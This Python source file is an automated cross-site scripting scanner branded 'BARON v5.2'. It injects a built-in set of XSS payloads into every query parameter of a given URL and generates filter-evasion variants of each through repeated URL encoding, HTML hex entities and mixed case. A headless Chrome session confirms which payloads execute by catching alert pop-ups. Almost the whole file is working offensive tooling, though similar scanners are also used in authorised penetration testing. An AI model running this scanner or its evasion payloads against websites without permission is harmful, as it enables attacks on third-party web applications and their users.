import sys
import urllib.parse
from colorama import Fore, Style, init

# --- ASCII LOGO (Your new, detailed logo block) ---
BARON_LOGO = f"""{Fore.RED}
    
     ██████╗  █████╗ ██████╗  ██████╗ ███╗   ██╗       ██████╗ ███████╗
     ██╔══██╗██╔══██╗██╔══██╗██╔═══██╗████╗  ██║       ██╔══██╗╚══███╔╝
     ██████╔╝███████║██████╔╝██║   ██║██╔██╗ ██║█████╗ ██║  ██║ ███╔╝ 
     ██╔══██╗██╔══██║██╔══██╗██║   ██║██║╚██╗██║╚════╝ ██║  ██║ ███╔╝  
     ██████╔╝██║  ██║██║  ██║╚██████╔╝██║ ╚████║       ██████╔╝███████╗
     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝       ╚═════╝ ╚══════╝

{Fore.CYAN}BARON {Fore.WHITE}v5.2 {Fore.CYAN}- {Fore.GREEN}Dedicated Selenium Pop-up Checker
{Style.RESET_ALL}
"""
# -----------------------------------

# --- SELENIUM IMPORTS ---
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException, NoAlertPresentException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    
# Initialize colorama
init(autoreset=True)

# --- CONFIGURATION ---
TIMEOUT = 5  # Set page load and alert wait timeout
CHROME_DRIVER_PATH = "/usr/bin/chromedriver"  # Confirmed path

# --- DEFAULT PAYLOADS (Used if no file is provided) ---
DEFAULT_POPUP_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "\"><img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "javascript:alert(1)",
    "\"></a><a href=\"javascript:alert(1)\">CLICK</a>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
]

def load_payloads(filename):
    """Loads raw payloads from a specified file."""
    if not filename:
        return []
    try:
        with open(filename, 'r') as f:
            raw_payloads = [line.strip() for line in f if line.strip()]
        return raw_payloads
    except FileNotFoundError:
        print(f"{Fore.RED}[X] Error: Payload file '{filename}' not found. Using integrated payloads.")
        return []

def encode_payloads(raw_payloads):
    """Encodes raw payloads into multiple variations (Base, URL, Double URL, Triple URL, Hex, Mixed Case)."""
    encoded_list = []
    for payload in raw_payloads:
        # 1. Base Payload (No Encoding)
        # Note: We skip adding the base payload here if 'encode_only' is active, but we handle that in the main block.
        
        # 2. URL Encoded
        url_encoded = urllib.parse.quote(payload)
        encoded_list.append((url_encoded, "URL Encoded"))
        # 3. Double URL Encoded
        double_encoded = urllib.parse.quote(url_encoded)
        encoded_list.append((double_encoded, "Double Encoded"))
        # 4. TRIPLE URL Encoded
        triple_encoded = urllib.parse.quote(double_encoded)
        encoded_list.append((triple_encoded, "Triple Encoded"))
        # 5. Hex/HTML Entity Encoded (common characters)
        hex_encoded = "".join([f"&#x{ord(c):X};" if c in "<>/'\"" else c for c in payload])
        encoded_list.append((hex_encoded, "Hex/HTML Entity"))
        # 6. Mixed Case Encoded
        mixed_case = "".join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
        encoded_list.append((mixed_case, "Mixed Case"))

    return encoded_list

def test_parameter(driver, parsed_url, query_params, target_param, encoded_payload_list):
    """Tests a single parameter with all encoded payloads."""
    
    success_count = 0
    confirmed_payloads = []
    total_tests = len(encoded_payload_list)

    print(f"\n{Fore.CYAN}*** Testing Parameter: {target_param} ***")

    for i, (payload, encoding_type) in enumerate(encoded_payload_list):
        sys.stdout.write(f"\r{Fore.YELLOW}[+] {target_param} Test {i+1}/{total_tests} ({encoding_type}): {payload[:30]}...{Style.RESET_ALL}")
        sys.stdout.flush()

        # Construct the test URL
        test_params = query_params.copy()
        
        # Assign payload as a list, as parse_qs returns list values.
        test_params[target_param] = [payload]  
        
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))

        try:
            driver.get(test_url)
            
            # --- INTERACTION CHECK ---
            if 'CLICK' in payload or 'input type="submit"' in payload:
                try:
                    if 'CLICK' in payload:
                        click_element = driver.find_element(By.PARTIAL_LINK_TEXT, "CLICK")
                    else:
                        click_element = driver.find_element(By.XPATH, "//input[@type='submit']")
                    
                    click_element.click()  
                except Exception:
                    pass
            # -------------------------
            
            # Wait for the JS alert/confirm pop-up
            WebDriverWait(driver, 3).until(EC.alert_is_present())

            # Handle the alert (Proof of Execution)
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()

            success_count += 1
            confirmed_payloads.append((target_param, payload, encoding_type, alert_text))
            sys.stdout.write(f"\r{Fore.GREEN}[VV] {target_param} TEST {i+1} ({encoding_type}): POP-UP CONFIRMED (Alert: {alert_text}) -> {payload[:40]}...\n")
            sys.stdout.flush()

        except (TimeoutException, NoAlertPresentException):
            pass
        except Exception as e:
            sys.stdout.write(f"\r{Fore.RED}[X] {target_param} TEST {i+1}: Browser Error ({type(e).__name__}). Payload skipped.\n")
            sys.stdout.flush()
            
    return success_count, confirmed_payloads


def run_selenium_check(base_url, encoded_payload_list):
    """
    Initializes WebDriver and tests ALL parameters found in the base URL.
    """
    if not SELENIUM_AVAILABLE:
        print(f"{Fore.RED}[X] Selenium not available. Cannot run browser check.")
        return 0, []

    # Removed the redundant print of the tool version here.

    # Configure Chrome options to run headless
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])  
    
    try:
        # Initialize WebDriver using the specified path
        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(TIMEOUT)  
        
    except WebDriverException as e:
        print(f"\n{Fore.RED}[X] WebDriver Error: Driver failed to start. Check CHROME_DRIVER_PATH and permissions.")
        print(f"{Fore.RED}Details: {e.msg.splitlines()[0]}\n")  
        return 0, []

    parsed_url = urllib.parse.urlparse(base_url)
    # This dictionary holds all original parameter values (values are lists)
    query_params = urllib.parse.parse_qs(parsed_url.query)  
    
    # Check if the raw query string ends with an empty parameter (like '?tck=') and force it into the dict
    raw_query = parsed_url.query
    if raw_query and "=" in raw_query and raw_query.endswith("="):
        key = raw_query.rsplit('=', 1)[0].split('&')[-1]
        if key and key not in query_params:
            query_params[key] = ['']
    
    overall_success_count = 0
    all_confirmed_payloads = []
    
    # Iterate over ALL parameters found
    for target_param in query_params.keys():
        success_count, confirmed_payloads = test_parameter(
            driver, parsed_url, query_params, target_param, encoded_payload_list
        )
        overall_success_count += success_count
        all_confirmed_payloads.extend(confirmed_payloads)
        
    driver.quit()
    return overall_success_count, all_confirmed_payloads

# --- Main Execution Block ---
if __name__ == "__main__":
    
    # --- Print the Logo at the very start ---
    print(BARON_LOGO)
    # ----------------------------------------
    
    base_url_input = input(f"1. Enter Base URL ({Fore.GREEN}Must include parameters, e.g., ?cat=&name=xss{Style.RESET_ALL}): ")
    payload_file_input = input(f"2. Enter Payloads File Name ({Fore.YELLOW}Leave blank to use integrated payloads{Style.RESET_ALL}): ")
    
    # --- NEW INPUT FOR ENCODING MODE ---
    encoding_mode = input(f"3. Select Mode: ({Fore.BLUE}A{Style.RESET_ALL})ll (Base + Encoded), ({Fore.BLUE}B{Style.RESET_ALL})ase Only, or ({Fore.BLUE}E{Style.RESET_ALL})ncoded Only: ").upper()
    
    if not "HTTP" in base_url_input.upper():
        print(f"{Fore.RED}[X] Error: URL format is invalid. Aborting.")
        sys.exit(1)

    raw_payloads = load_payloads(payload_file_input)

    if not raw_payloads:
        raw_payloads = DEFAULT_POPUP_PAYLOADS
        print(f"{Fore.YELLOW}[*] Using {len(raw_payloads)} integrated base payloads.")

    # --- DETERMINE PAYLOADS BASED ON MODE ---
    
    encoded_payloads_to_test = []
    
    if encoding_mode == 'B' or encoding_mode not in ('A', 'B', 'E'):
        # Mode B: Base Only (or default if selection is invalid)
        print(f"{Fore.YELLOW}[*] Mode: Base Payloads Only Selected.")
        # Payloads are stored as (payload, encoding_type)
        encoded_payloads_to_test = [(p, "Base") for p in raw_payloads]
        
    elif encoding_mode == 'E':
        # Mode E: Encoded Payloads Only
        print(f"{Fore.YELLOW}[*] Mode: Encoded Payloads Only Selected.")
        encoded_payloads_to_test = encode_payloads(raw_payloads)

    elif encoding_mode == 'A':
        # Mode A: All (Base + Encoded)
        print(f"{Fore.YELLOW}[*] Mode: All Payloads (Base + Encoded) Selected.")
        # Start with Base payloads
        encoded_payloads_to_test.extend([(p, "Base") for p in raw_payloads])
        # Add encoded payloads
        encoded_payloads_to_test.extend(encode_payloads(raw_payloads))
        
    # --- PARAMETER CHECK (REMAINS THE SAME) ---
    parsed_url = urllib.parse.urlparse(base_url_input)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    # Check for raw query parameters to ensure we catch those ending with '='
    raw_query = parsed_url.query
    if raw_query and "=" in raw_query and raw_query.endswith("="):
        key = raw_query.rsplit('=', 1)[0].split('&')[-1]
        if key and key not in query_params:
            query_params[key] = ['']
    
    if not query_params:
        print(f"{Fore.RED}[X] Error: URL has no query parameters to test. Aborting.")
        sys.exit(1)
        
    print(f"{Fore.MAGENTA}[*] Found {len(query_params)} parameters: {', '.join(query_params.keys())}")
    
    # Calculate total tests based on the chosen mode
    total_tests = len(encoded_payloads_to_test) * len(query_params)

    # --- Run Selenium Check ---
    total_success, confirmed_payloads = run_selenium_check(base_url_input, encoded_payloads_to_test)

    # --- Display Final Summary ---
    print(f"\n\n{Fore.CYAN}--- BARON: Test Summary ---")
    print(f"[*] Testing Mode: {encoding_mode}")
    print(f"[*] Total Parameters Tested: {len(query_params)}")
    print(f"[*] Total Tests Run: {total_tests}")
    print(f"{Fore.GREEN}[VV] Confirmed XSS (Pop-up Detected): {total_success}")
    print("----------------------------")
    
    if confirmed_payloads:
        print(f"\n{Fore.CYAN}Confirmed XSS Payloads:")
        for param, payload, encoding_type, alert_text in confirmed_payloads:
            print(f"{Fore.MAGENTA}[VV] PARAM: {param} | [{encoding_type}] (Alert: {alert_text}) -> {payload}")
    
    print("\n[i] Remember to check your ChromeDriver permissions if the tool failed to start.")
